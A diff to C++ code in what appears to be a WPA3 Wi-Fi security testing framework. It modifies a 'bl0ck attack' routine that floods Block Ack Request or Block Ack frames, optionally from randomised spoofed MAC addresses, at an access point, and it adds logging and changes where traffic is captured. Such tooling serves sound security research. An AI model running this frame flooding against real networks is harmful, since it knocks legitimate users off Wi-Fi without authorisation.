@@ -67,17 +67,28 @@ namespace wpa3_tester::bl0ck_attack{
         const auto start_time = steady_clock::now();
         const auto end_time = start_time + seconds(duration_sec);
 
+        int iteration = 0;
         while (steady_clock::now() < end_time) {
-            const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);
-            RadioTap block_frame = get_bl0ck_frame(ap_hw, sta_hw, subtype);
-            for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
-            this_thread::sleep_for(microseconds(100));
+            try {
+                const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);
+
+                RadioTap block_frame = get_bl0ck_frame(ap_hw, sta_hw, subtype);
+                log(LogLevel::DEBUG, "Sending batch %d", iteration);
+                for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
+                this_thread::sleep_for(100ms);
+                iteration++;
+
+            } catch (const exception& e) {
+                log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
+                throw;
+            }
         }
+        log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
     }
 
     void speed_observation_start(RunStatus &rs){
         observer::start_musezahn(rs, "mz_gen", "client", "access_point");
-        observer::start_thark(rs, "attacker", "udp port 5201 or (wlan[0] == 0x84) or (wlan[0] == 0x94)");
+        observer::start_thark(rs, "client", "udp port 5201");
     }
 
     void run_bl0ck_attack(RunStatus& rs){
@@ -97,6 +108,7 @@ namespace wpa3_tester::bl0ck_attack{
         speed_observation_start(rs); // TODO separate from channel switch attack
 
         log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
+        this_thread::sleep_for(seconds(10));
         if(bl0ck_att_type == "BAR" || bl0ck_att_type == "BA"){
             block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
         } else {
@@ -106,7 +118,7 @@ namespace wpa3_tester::bl0ck_attack{
             }*/
             throw not_implemented_error("Unsupported attack type");
         }
-        this_thread::sleep_for(seconds(duration+5));
+        this_thread::sleep_for(seconds(5));
         log(LogLevel::INFO, "Block Attack END");
     }
 
@@ -117,7 +129,7 @@ namespace wpa3_tester::bl0ck_attack{
         vector<observer::graph_lines> events;
         //events.push_back({disconn_events,"DISCONN", "red"});
 
-        const string STA_graph_path = observer::tshark_graph(rs, "attacker", events);
+        const string STA_graph_path = observer::tshark_graph(rs, "client", events);
         log(LogLevel::INFO, "Bl0ck attack stop");
     }
 }
